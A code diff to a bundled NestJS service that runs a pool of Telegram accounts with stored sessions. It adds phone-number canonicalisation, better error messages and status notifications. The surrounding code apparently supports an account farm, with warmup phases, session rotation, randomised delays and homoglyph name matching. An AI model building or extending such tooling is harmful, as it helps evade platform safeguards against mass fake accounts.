@@ -11514,16 +11514,33 @@ const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
 const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
 const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
+function isRecord(value) {
+    return typeof value === 'object' && value !== null && !Array.isArray(value);
+}
+function getErrorMessage(error) {
+    if (error instanceof Error)
+        return error.message;
+    if (isRecord(error)) {
+        const errorMessage = error.errorMessage;
+        if (typeof errorMessage === 'string')
+            return errorMessage;
+        const message = error.message;
+        if (typeof message === 'string')
+            return message;
+    }
+    return String(error);
+}
 async function ensurePrivacy(ctx, expectations) {
     let readFailures = 0;
     let writeFailures = 0;
+    const failureReasons = [];
     const mismatches = [];
     for (const expectation of expectations) {
         const { key, label, desired } = expectation;
         try {
             const current = await ctx.client.invoke(new telegram_1.Api.account.GetPrivacy({ key }));
-            const hasAllowAll = current.rules.some((r) => r.className === 'PrivacyValueAllowAll');
-            const hasDisallowAll = current.rules.some((r) => r.className === 'PrivacyValueDisallowAll');
+            const hasAllowAll = current.rules.some((rule) => rule.className === 'PrivacyValueAllowAll');
+            const hasDisallowAll = current.rules.some((rule) => rule.className === 'PrivacyValueDisallowAll');
             const isCorrect = desired === 'allow' ? hasAllowAll : hasDisallowAll;
             if (isCorrect) {
                 ctx.logger.debug(ctx.phoneNumber, `Privacy ${label}: OK (${desired})`);
@@ -11534,13 +11551,15 @@ async function ensurePrivacy(ctx, expectations) {
             }
         }
         catch (err) {
-            ctx.logger.warn(ctx.phoneNumber, `Privacy ${label}: read failed — ${err.message}`);
+            const errorMessage = getErrorMessage(err);
+            ctx.logger.warn(ctx.phoneNumber, `Privacy ${label}: read failed — ${errorMessage}`);
+            failureReasons.push(`${label} read: ${errorMessage}`);
             readFailures++;
         }
         await (0, Helpers_1.sleep)(1000 + Math.random() * 2000);
     }
     if (mismatches.length === 0) {
-        return { updated: 0, readFailures, writeFailures, allConfirmed: readFailures === 0 };
+        return { updated: 0, readFailures, writeFailures, allConfirmed: readFailures === 0, failureReasons };
     }
     let updated = 0;
     for (const { key, label, desired } of mismatches) {
@@ -11553,12 +11572,14 @@ async function ensurePrivacy(ctx, expectations) {
             updated++;
         }
         catch (err) {
-            ctx.logger.warn(ctx.phoneNumber, `Privacy ${label}: write failed — ${err.message}`);
+            const errorMessage = getErrorMessage(err);
+            ctx.logger.warn(ctx.phoneNumber, `Privacy ${label}: write failed — ${errorMessage}`);
+            failureReasons.push(`${label} write: ${errorMessage}`);
             writeFailures++;
         }
         await (0, Helpers_1.sleep)(3000 + Math.random() * 7000);
     }
-    return { updated, readFailures, writeFailures, allConfirmed: readFailures === 0 && writeFailures === 0 };
+    return { updated, readFailures, writeFailures, allConfirmed: readFailures === 0 && writeFailures === 0, failureReasons };
 }
 const ACTIVE_PRIVACY = [
     { key: new telegram_1.Api.InputPrivacyKeyPhoneCall(), label: 'PhoneCall', desired: 'disallow' },
@@ -11584,7 +11605,8 @@ const DEACTIVATE_PRIVACY = [
 async function updatePrivacyforDeletedAccount(ctx) {
     const result = await ensurePrivacy(ctx, DEACTIVATE_PRIVACY);
     if (!result.allConfirmed) {
-        const msg = `Privacy deactivate incomplete: ${result.readFailures} read failure(s), ${result.writeFailures} write failure(s)`;
+        const details = result.failureReasons.slice(0, 5).join('; ');
+        const msg = `Privacy deactivate incomplete: ${result.readFailures} read failure(s), ${result.writeFailures} write failure(s)${details ? ` — ${details}` : ''}`;
         ctx.logger.warn(ctx.phoneNumber, msg);
         throw new Error(msg);
     }
@@ -17855,8 +17877,8 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
                     assignment.assignedBio != null);
                 if (hasAnyAssignment) {
                     const fullUser = await telegramClient.client.invoke(new telegram_1.Api.users.GetFullUser({ id: new telegram_1.Api.InputUserSelf() }));
-                    const currentLastName = fullUser?.users?.[0]?.lastName || '';
-                    const currentBio = fullUser?.fullUser?.about || '';
+                    const currentLastName = this.readNestedString(fullUser, ['users', 0, 'lastName']);
+                    const currentBio = this.readNestedString(fullUser, ['fullUser', 'about']);
                     const firstNameWrong = assignment?.assignedFirstName != null
                         && !(0, homoglyph_normalizer_1.nameMatchesAssignment)(me.firstName || '', assignment.assignedFirstName);
                     const lastNameWrong = assignment?.assignedLastName != null
@@ -17906,7 +17928,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -17952,7 +17974,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -17961,15 +17983,17 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
         }
     }
     async create(bufferClient) {
+        const canonicalMobile = this.canonicalMobile(bufferClient.mobile);
+        const createData = { ...bufferClient, mobile: canonicalMobile };
         const result = await this.bufferClientModel.create({
-            ...bufferClient,
+            ...createData,
             status: bufferClient.status || 'active',
         });
-        this.logger.log(`Buffer Client Created:\n\nMobile: ${bufferClient.mobile}`);
+        this.logger.log(`Buffer Client Created:\n\nMobile: ${canonicalMobile}`);
         await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, [
             '<b>Buffer Client Created</b>',
             '',
-            `<b>Mobile:</b> ${bufferClient.mobile}`,
+            `<b>Mobile:</b> ${canonicalMobile}`,
             `<b>Client ID:</b> ${bufferClient.clientId || '-'}`,
             `<b>Status:</b> ${result.status}`,
             `<b>Available Date:</b> ${bufferClient.availableDate || '-'}`,
@@ -17983,18 +18007,29 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
         return this.bufferClientModel.find(filter).exec();
     }
     async findOne(mobile, throwErr = true) {
-        const bufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const bufferClient = (await this.bufferClientModel.findOne({ mobile: canonicalMobile }).exec())?.toJSON() || null;
         if (!bufferClient && throwErr) {
             throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
         }
         return bufferClient;
     }
     async existsByMobile(mobile) {
-        return !!(await this.bufferClientModel.findOne({ mobile }, { _id: 1 }).lean().exec());
+        const canonicalMobile = this.canonicalMobile(mobile);
+        return !!(await this.bufferClientModel.findOne({ mobile: canonicalMobile }, { _id: 1 }).lean().exec());
     }
     async update(mobile, updateClientDto) {
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const updateData = { ...updateClientDto };
+        if (updateData.mobile !== undefined) {
+            const payloadMobile = this.canonicalMobile(updateData.mobile);
+            if (payloadMobile !== canonicalMobile) {
+                throw new common_1.BadRequestException('mobile in payload must match route mobile');
+            }
+            updateData.mobile = canonicalMobile;
+        }
         const updatedBufferClient = await this.bufferClientModel
-            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
+            .findOneAndUpdate({ mobile: canonicalMobile }, { $set: updateData }, { new: true, returnDocument: 'after' })
             .exec();
         if (!updatedBufferClient) {
             throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
@@ -18002,13 +18037,18 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
         return updatedBufferClient;
     }
     async createOrUpdate(mobile, createorUpdateBufferClientDto) {
-        const existingBufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
-        if (existingBufferClient) {
-            return this.update(existingBufferClient.mobile, createorUpdateBufferClientDto);
+        const canonicalMobile = this.canonicalMobile(mobile);
+        if (await this.existsByMobile(canonicalMobile)) {
+            const updateDto = {
+                ...createorUpdateBufferClientDto,
+                mobile: canonicalMobile,
+            };
+            return this.update(canonicalMobile, updateDto);
         }
         else {
             const createDto = {
                 ...createorUpdateBufferClientDto,
+                mobile: canonicalMobile,
                 status: createorUpdateBufferClientDto.status || 'active',
             };
             return this.create(createDto);
@@ -18016,13 +18056,14 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
     }
     async remove(mobile, message) {
         try {
-            const bufferClient = await this.findOne(mobile, false);
+            const canonicalMobile = this.canonicalMobile(mobile);
+            const bufferClient = await this.findOne(canonicalMobile, false);
             if (!bufferClient) {
                 throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
             }
-            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
-            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client\n\nMobile: ${mobile}\nReason: ${message || 'manual removal'}`)}`);
-            await this.bufferClientModel.deleteOne({ mobile }).exec();
+            this.logger.log(`Removing BufferClient with mobile: ${canonicalMobile}`);
+            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client\n\nMobile: ${canonicalMobile}\nReason: ${message || 'manual removal'}`)}`);
+            await this.bufferClientModel.deleteOne({ mobile: canonicalMobile }).exec();
         }
         catch (error) {
             const errorDetails = (0, parseError_1.parseError)(error, `failed to delete BufferClient: ${mobile}`);
@@ -18039,7 +18080,10 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             return [];
         }
         const query = { ...filter };
-        const regexFields = ['mobile', 'username', 'clientId'];
+        if (typeof query.mobile === 'string' && query.mobile) {
+            query.mobile = this.canonicalMobile(query.mobile);
+        }
+        const regexFields = ['username', 'clientId'];
         for (const field of regexFields) {
             if (typeof query[field] === 'string' && query[field]) {
                 query[field] = { $regex: new RegExp(query[field].replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i') };
@@ -18075,8 +18119,18 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
         if (status === 'inactive') {
             updateData.inUse = false;
         }
-        await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Buffer Client Status Update</b>\n\n<b>Mobile:</b> ${mobile}\n<b>New Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}`, { parseMode: 'HTML' });
-        return await this.update(mobile, updateData);
+        try {
+            const updated = await this.update(mobile, updateData);
+            this.logger.log(`Buffer client ${mobile} status updated to ${status}`);
+            this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Buffer Client Status Update</b>\n\n<b>Mobile:</b> ${mobile}\n<b>New Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}`, { parseMode: 'HTML' }).catch((error) => this.logger.error(`Failed to send buffer status success notification for ${mobile}: ${error instanceof Error ? error.message : String(error)}`));
+            return updated;
+        }
+        catch (error) {
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            this.logger.error(`Failed to update buffer client ${mobile} status to ${status}: ${errorMessage}`);
+            this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Buffer Client Status Update Failed</b>\n\n<b>Mobile:</b> ${mobile}\n<b>Attempted Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}\n<b>Error:</b> ${errorMessage}`, { parseMode: 'HTML' }).catch((notifyError) => this.logger.error(`Failed to send buffer status failure notification for ${mobile}: ${notifyError instanceof Error ? notifyError.message : String(notifyError)}`));
+            throw error;
+        }
     }
     async setPrimaryInUse(clientId, mobile) {
         const now = new Date();
@@ -18179,7 +18233,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
                 const errorDetails = (0, parseError_1.parseError)(error, `RefillJoinQueueErr: ${doc.mobile}`);
                 if ((0, isPermanentError_1.default)(errorDetails)) {
                     const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                    await this.markAsInactive(doc.mobile, reason);
+                    await this.deactivateClient(doc.mobile, reason);
                 }
             }
             finally {
@@ -18217,24 +18271,25 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
         }
     }
     async setAsBufferClient(mobile, clientId, availableDate = client_helper_utils_1.ClientHelperUtils.getTodayDateString()) {
-        const user = (await this.usersService.search({ mobile, expired: false }))[0];
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const user = (await this.usersService.search({ mobile: canonicalMobile, expired: false }))[0];
         if (!user)
             throw new common_1.BadRequestException('user not found');
-        const isExist = await this.findOne(mobile, false);
+        const isExist = await this.findOne(canonicalMobile, false);
         if (isExist)
             throw new common_1.ConflictException('BufferClient already exist');
         const clients = await this.clientService.findAll();
         const clientMobiles = clients.map((client) => client?.mobile);
-        if (clientMobiles.includes(mobile))
+        if (clientMobiles.some((clientMobile) => this.mobilesMatch(clientMobile, canonicalMobile)))
             throw new common_1.BadRequestException('Number is an Active Client');
-        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
+        const telegramClient = await connection_manager_1.connectionManager.getClient(canonicalMobile, { autoDisconnect: false });
         try {
-            const channels = await this.telegramService.getChannelInfo(mobile, true);
+            const channels = await this.telegramService.getChannelInfo(canonicalMobile, true);
             await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));
             const bufferClient = {
                 tgId: user.tgId,
                 session: user.session,
-                mobile: user.mobile,
+                mobile: canonicalMobile,
                 availableDate,
                 channels: channels.ids.length,
                 clientId,
@@ -18243,7 +18298,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
                 lastUsed: null,
             };
             await this.bufferClientModel
-                .findOneAndUpdate({ mobile: user.mobile }, {
+                .findOneAndUpdate({ mobile: canonicalMobile }, {
                 $set: {
                     ...bufferClient,
                     warmupPhase: base_client_service_1.WarmupPhase.ENROLLED,
@@ -18254,7 +18309,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
                 .exec();
         }
         catch (error) {
-            const errorDetails = (0, parseError_1.parseError)(error, `Failed to set as Buffer Client ${mobile}`);
+            const errorDetails = (0, parseError_1.parseError)(error, `Failed to set as Buffer Client ${canonicalMobile}`);
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 try {
                     await this.usersService.update(user.tgId, { expired: true });
@@ -18264,7 +18319,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             throw new common_1.HttpException(errorDetails.message, errorDetails.status);
         }
         finally {
-            await this.safeUnregisterClient(mobile);
+            await this.safeUnregisterClient(canonicalMobile);
         }
         return 'Client enrolled as buffer successfully';
     }
@@ -18624,8 +18679,8 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             const warmupPhase = bufferClient.warmupPhase || base_client_service_1.WarmupPhase.ENROLLED;
             if (warmupPhase === base_client_service_1.WarmupPhase.SESSION_ROTATED) {
                 const lastChecked = bufferClient.lastChecked ? new Date(bufferClient.lastChecked).getTime() : 0;
-                const healthCheckPassed = await this.performHealthCheck(bufferClient.mobile, lastChecked, now);
-                if (!healthCheckPassed)
+                const healthCheck = await this.performHealthCheck(bufferClient.mobile, lastChecked, now);
+                if (!healthCheck.passed)
                     continue;
             }
             const processResult = await this.processClient(bufferClient, client);
@@ -18769,7 +18824,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
                 const errorDetails = (0, parseError_1.parseError)(error, `JoinChannelErr: ${mobile}`);
                 if ((0, isPermanentError_1.default)(errorDetails)) {
                     const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                    await this.markAsInactive(mobile, reason);
+                    await this.deactivateClient(mobile, reason);
                 }
             }
             finally {
@@ -18790,9 +18845,9 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
     }
     async isMobileEnrolledAnywhere(mobile) {
         const [bufferExists, promoteExists, clientExists] = await Promise.all([
-            this.bufferClientModel.findOne({ mobile }, { _id: 1 }).lean().exec(),
+            this.existsByMobile(mobile),
             this.promoteClientService.existsByMobile(mobile),
-            this.clientService.findAll().then((clients) => clients.some((c) => c.mobile === mobile)),
+            this.clientService.findAll().then((clients) => clients.some((c) => this.mobilesMatch(c.mobile, mobile))),
         ]);
         if (bufferExists)
             return 'bufferClients';
@@ -18819,10 +18874,14 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
             await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));
             const user = (await this.usersService.search({ mobile: document.mobile }))[0];
+            if (!user?.session?.trim()) {
+                this.logger.warn(`Skipping buffer enrollment for ${document.mobile}: source user/session missing`);
+                return false;
+            }
             const targetAvailableDate = availableDate || client_helper_utils_1.ClientHelperUtils.getTodayDateString();
             const bufferClient = {
                 tgId: document.tgId,
-                session: user?.session || '',
+                session: user.session,
                 mobile: document.mobile,
                 lastUsed: null,
                 availableDate: targetAvailableDate,
@@ -18856,10 +18915,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService exte
             const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
             this.logger.error(`Error processing buffer client ${document.mobile}: ${errorDetails.message}`);
             if ((0, isPermanentError_1.default)(errorDetails)) {
-                try {
-                    await this.markAsInactive(document.mobile, errorDetails.message);
-                }
-                catch { }
+                await this.deactivateClient(document.mobile, errorDetails.message);
                 try {
                     await this.usersService.update(document.tgId, { expired: true });
                 }
@@ -19164,8 +19220,10 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.CreateBufferClientDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
 const base_client_service_1 = __webpack_require__(/*! ../../shared/base-client.service */ "./src/components/shared/base-client.service.ts");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class CreateBufferClientDto {
 }
 exports.CreateBufferClientDto = CreateBufferClientDto;
@@ -19180,7 +19238,9 @@ __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Mobile number of the client'
     }),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], CreateBufferClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -19292,14 +19352,18 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.SearchBufferClientDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class SearchBufferClientDto {
 }
 exports.SearchBufferClientDto = SearchBufferClientDto;
 __decorate([
     (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number to search for.' }),
     (0, class_validator_1.IsOptional)(),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], SearchBufferClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -19515,6 +19579,7 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.BufferClientSchema = exports.BufferClient = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 let BufferClient = class BufferClient {
 };
 exports.BufferClient = BufferClient;
@@ -19525,7 +19590,7 @@ __decorate([
 ], BufferClient.prototype, "tgId", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Unique mobile number for the Telegram account.' }),
-    (0, mongoose_1.Prop)({ required: true, unique: true }),
+    (0, mongoose_1.Prop)({ required: true, unique: true, set: mobile_utils_1.canonicalizeMobile }),
     __metadata("design:type", String)
 ], BufferClient.prototype, "mobile", void 0);
 __decorate([
@@ -21184,6 +21249,7 @@ const homoglyph_normalizer_1 = __webpack_require__(/*! ../../utils/homoglyph-nor
 const warmup_phases_1 = __webpack_require__(/*! ../shared/warmup-phases */ "./src/components/shared/warmup-phases.ts");
 const client_helper_utils_1 = __webpack_require__(/*! ../shared/client-helper.utils */ "./src/components/shared/client-helper.utils.ts");
 const helpers_1 = __webpack_require__(/*! ../Telegram/manager/helpers */ "./src/components/Telegram/manager/helpers.ts");
+const mobile_utils_1 = __webpack_require__(/*! ../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 const CONFIG = {
     REFRESH_INTERVAL: 5 * 60 * 1000,
     CACHE_TTL: 10 * 60 * 1000,
@@ -21304,9 +21370,13 @@ let ClientService = ClientService_1 = class ClientService {
         }
     }
     async create(createClientDto) {
+        const createData = {
+            ...createClientDto,
+            mobile: this.canonicalMobile(createClientDto.mobile),
+        };
         try {
             const createdClient = await this.executeWithRetry(() => {
-                const client = new this.clientModel(createClientDto);
+                const client = new this.clientModel(createData);
                 return client.save();
             });
             this.clientsMap.set(createdClient.clientId, createdClient.toObject());
@@ -21314,7 +21384,7 @@ let ClientService = ClientService_1 = class ClientService {
             return createdClient;
         }
         catch (error) {
-            const errorDetails = (0, parseError_1.parseError)(error, `Failed to create client | mobile: ${createClientDto.mobile}`);
+            const errorDetails = (0, parseError_1.parseError)(error, `Failed to create client | mobile: ${createData.mobile}`);
             throw new common_1.BadRequestException(errorDetails.message);
         }
     }
@@ -21373,6 +21443,9 @@ let ClientService = ClientService_1 = class ClientService {
         this.ensureInitialized();
         try {
             const cleanUpdateDto = this.cleanUpdateObject(updateClientDto);
+            if (cleanUpdateDto.mobile !== undefined) {
+                cleanUpdateDto.mobile = this.canonicalMobile(cleanUpdateDto.mobile);
+            }
             await this.notifyClientUpdate(clientId);
             const updatedClient = await this.executeWithRetry(() => this.clientModel
                 .findOneAndUpdate({ clientId }, { $set: cleanUpdateDto }, { new: true, runValidators: true })
@@ -21429,6 +21502,15 @@ let ClientService = ClientService_1 = class ClientService {
         delete cleaned._id;
         return cleaned;
     }
+    canonicalMobile(mobile) {
+        try {
+            return (0, mobile_utils_1.canonicalizeMobile)(mobile);
+        }
+        catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            throw new common_1.BadRequestException(message);
+        }
+    }
     async notifyClientUpdate(clientId) {
         await this.notify(`Client Update\n\nClient: ${clientId}\nStatus: Updating existing client`);
     }
@@ -21439,7 +21521,8 @@ let ClientService = ClientService_1 = class ClientService {
             });
         }
         catch (error) {
-            this.logger.warn('Failed to send notification', error.message);
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            this.logger.warn('Failed to send notification', errorMessage);
         }
     }
     performPostUpdateTasks(updatedClient) {
@@ -21461,7 +21544,10 @@ let ClientService = ClientService_1 = class ClientService {
     }
     processTextSearchFields(filter) {
         const nextFilter = { ...filter };
-        const textFields = ['name', 'mobile', 'clientId', 'username'];
+        if (typeof nextFilter.mobile === 'string' && nextFilter.mobile) {
+            nextFilter.mobile = this.canonicalMobile(nextFilter.mobile);
+        }
+        const textFields = ['name', 'clientId', 'username'];
         textFields.forEach((field) => {
             const value = nextFilter[field];
             if (typeof value === 'string' && value) {
@@ -21479,7 +21565,8 @@ let ClientService = ClientService_1 = class ClientService {
                 return await operation();
             }
             catch (error) {
-                this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, error.message);
+                const errorMessage = error instanceof Error ? error.message : String(error);
+                this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, errorMessage);
                 if (attempt === retries)
                     throw error;
                 const delay = CONFIG.RETRY_DELAY * Math.pow(2, attempt - 1);
@@ -21572,7 +21659,8 @@ let ClientService = ClientService_1 = class ClientService {
             await this.updateClientSession(newBufferClient.session, newBufferClient.mobile);
         }
         catch (error) {
-            await this.notify(`Client Swap Failed\n\nClient: ${clientId}\nOld Mobile: ${existingClient.mobile}\nNew Mobile: ${newBufferClient.mobile}\nError: ${error.message?.substring(0, 200)}`);
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            await this.notify(`Client Swap Failed\n\nClient: ${clientId}\nOld Mobile: ${existingClient.mobile}\nNew Mobile: ${newBufferClient.mobile}\nError: ${errorMessage.substring(0, 200)}`);
             const errorDetails = (0, parseError_1.parseError)(error, `setupClient failed for ${newBufferClient.mobile}`);
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 await this.bufferClientService.markAsInactive(newBufferClient.mobile, `Setup failed permanently: ${errorDetails.message}`);
@@ -21704,8 +21792,13 @@ let ClientService = ClientService_1 = class ClientService {
     async handleClientArchival(existingClient, existingMobile, formalities, archiveOld, days, reason) {
         try {
             const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];
-            if (!existingClientUser)
+            if (!existingClientUser) {
+                const reasonMessage = `Archival failed: user document missing for old mobile ${existingMobile}`;
+                this.logger.warn(reasonMessage);
+                await this.markBufferInactiveForArchival(existingMobile, reasonMessage);
+                await this.notify(`Archival User Missing\n\nOld Mobile: ${existingMobile}\nStatus: Buffer marked inactive`);
                 return;
+            }
             if (formalities) {
                 await this.handleFormalities(existingMobile);
             }
@@ -21730,9 +21823,25 @@ let ClientService = ClientService_1 = class ClientService {
             const errorDetails = (0, parseError_1.parseError)(e, `Error in Archiving Old Client: ${existingMobile}`, false);
             const errorMessage = e instanceof Error ? e.message : String(e);
             if ((0, isPermanentError_1.default)(errorDetails)) {
-                await this.bufferClientService.markAsInactive(existingMobile, errorMessage);
+                await this.markBufferInactiveForArchival(existingMobile, errorMessage);
             }
             await this.notify(`Archival Failed\n\nOld Mobile: ${existingMobile}\nError: ${errorMessage?.substring(0, 200)}`);
+        }
+    }
+    async markBufferInactiveForArchival(mobile, reason) {
+        try {
+            const updated = await this.bufferClientService.updateStatus(mobile, 'inactive', reason);
+            this.logger.warn(`Archived buffer client marked inactive`, {
+                mobile,
+                status: updated?.status,
+                message: updated?.message,
+            });
+            await this.notify(`Buffer Marked Inactive\n\nMobile: ${mobile}\nReason: ${reason.substring(0, 200)}`);
+        }
+        catch (error) {
+            const errorDetails = (0, parseError_1.parseError)(error, `Failed to mark archived buffer inactive: ${mobile}`, false);
+            this.logger.error(`Failed to mark archived buffer inactive for ${mobile}: ${errorDetails.message}`);
+            await this.notify(`Buffer Inactive Update Failed\n\nMobile: ${mobile}\nReason: ${reason.substring(0, 160)}\nError: ${errorDetails.message.substring(0, 200)}`);
         }
     }
     async handleFormalities(mobile) {
@@ -21769,8 +21878,8 @@ let ClientService = ClientService_1 = class ClientService {
             const errorDetails = (0, parseError_1.parseError)(error, `Error in Archiving Old Client: ${existingMobile}`, true);
             await this.notify(`Archival Error\n\nOld Mobile: ${existingMobile}\nError: ${errorDetails.message?.substring(0, 200)}`);
             if ((0, isPermanentError_1.default)(errorDetails)) {
-                this.logger.log('Marking archived user inactive:', existingClientUser.mobile);
-                await this.bufferClientService.markAsInactive(existingClientUser.mobile, errorDetails.message);
+                this.logger.log('Marking archived buffer inactive:', existingMobile);
+                await this.markBufferInactiveForArchival(existingMobile, errorDetails.message);
             }
             else {
                 this.logger.log('Not Deleting user');
@@ -22164,6 +22273,7 @@ exports.CreateClientDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class CreateClientDto {
 }
 exports.CreateClientDto = CreateClientDto;
@@ -22193,8 +22303,8 @@ __decorate([
 ], CreateClientDto.prototype, "name", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
-    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], CreateClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -22427,6 +22537,7 @@ exports.SearchClientDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class SearchClientDto {
 }
 exports.SearchClientDto = SearchClientDto;
@@ -22468,9 +22579,9 @@ __decorate([
